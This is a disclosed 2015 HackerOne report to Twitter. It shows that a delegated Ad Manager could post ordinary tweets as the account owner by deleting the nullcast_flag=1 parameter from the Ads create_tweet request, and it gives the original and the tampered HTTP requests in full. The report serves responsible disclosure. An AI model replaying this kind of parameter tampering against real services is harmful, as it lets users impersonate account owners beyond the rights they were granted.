@@ -1,0 +1,74 @@
+ReportLink:https://hackerone.com/reports/31082
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/anshuman_bh
+ReportedTo:Twitter(twitter)
+BountyAmount:420.0
+Severity:
+State:Closed
+DateOfDisclosure:07.05.2015 15:11:16
+
+Summary:
+
+When the Ads & Analytics feature is enabled in a user account, navigate to `https://ads.twitter.com/accounts/<redacted>/account_users.`
+
+Here, the account owner can add other twitter users as Account Administrator, Ad Manager or Analyst. There is also a check box shown "Allow user to create new Promoted-only Tweets for use in campaigns". For the sake of PoC, the account owner is `abtest67` and this owner is assigning the role of `Ad Manager` with the ***ability to compose promoted tweets*** to the user `abtest66`. See Screenshot 1. 
+
+Notice the timeline for `abtest67` looks like Screenshot 2.
+
+Now, the account of the user `abtest66` gets a new option to `Switch accounts`. When clicked, this user can choose to switch the ads dashboard to `abtest67`. See Screenshot 3. 
+
+When switched to `abtest67`'s dashboard, notice that `abtest66` is only allowed to compose ***promoted tweets*** within a campaign. He is ***not*** allowed to compose an actual tweet on `abtest67`'s timeline.  
+
+***It was observed that this can be bypassed by removing the POST parameter `nullcast_flag=1` in the request to the URL `https://ads.twitter.com/accounts/<redacted>/tweet_box/create_tweet?format=json`***
+
+So, what this means is that when `abtest66` would compose a promoted tweet, the request would look like:
+
+```
+POST /accounts/<redacted>/tweet_box/create_tweet?format=json HTTP/1.1
+Host: ads.twitter.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-Token: <redacted>
+X-Requested-With: XMLHttpRequest
+Referer: https://ads.twitter.com/accounts/18ce53wzkkf/campaigns/new/followers?source=campaign_dashboard
+Content-Length: 92
+Cookie: 
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+account=<redacted>&form_location=objective_creative_composer&nullcast_flag=1&tweet_text=test
+```
+
+The tweet as a result of the above request is a promoted tweet and does not appear on `abtest67`'s timeline for obvious reasons. 
+
+But, if in the above request, the parameter `nullcast_flag=1` is removed and the request re-sent (For example, from the Repeater tab in Burp), `abtest66` is able to actually ***tweet*** on behalf of `abtest67`. This is no longer just a ***promoted*** tweet. The request would look like:
+
+```
+POST /accounts/<redacted>/tweet_box/create_tweet?format=json HTTP/1.1
+Host: ads.twitter.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-Token: <redacted>
+X-Requested-With: XMLHttpRequest
+Referer: https://ads.twitter.com/accounts/18ce53wzkkf/campaigns/new/followers?source=campaign_dashboard
+Content-Length: 77
+Cookie: <redacted>
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+account=<redacted>&form_location=objective_creative_composer&tweet_text=test
+```
+
+Notice that a new tweet "test" just shows up on `abtest67`'s timeline. See Screenshot 4. 
+
+This should not have happened as `abtest67` never gave the rights to tweet on his behalf to the user `abtest66`. If there are campaigns that are halted or not running for some reason, malicious users (with some rights to an account) could potentially impersonate the account owners and tweet on their behalf. The concept of ***promoted tweet*** is irrelevant at that point. 
+
+Cheers!
